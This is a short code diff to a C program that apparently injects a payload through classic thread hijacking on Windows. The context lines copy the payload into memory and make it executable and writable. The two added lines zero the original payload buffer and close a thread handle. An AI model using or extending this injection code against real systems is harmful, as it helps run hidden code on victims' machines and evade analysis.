@@ -300,6 +300,7 @@ BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_
 
 	// Copying the payload to the allocated memory
 	memcpy(pAddress, pPayload, sPayloadSize);
+    memset(pPayload, '\0', sPayloadSize);
 
 	// Changing the memory protection
 	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
@@ -396,6 +397,8 @@ int main() {
 
 	printf("[#] Press <Enter> To Quit ... ");
 	getchar();
+
+    CloseHandle(hThread);
 
 	return 0;
 }
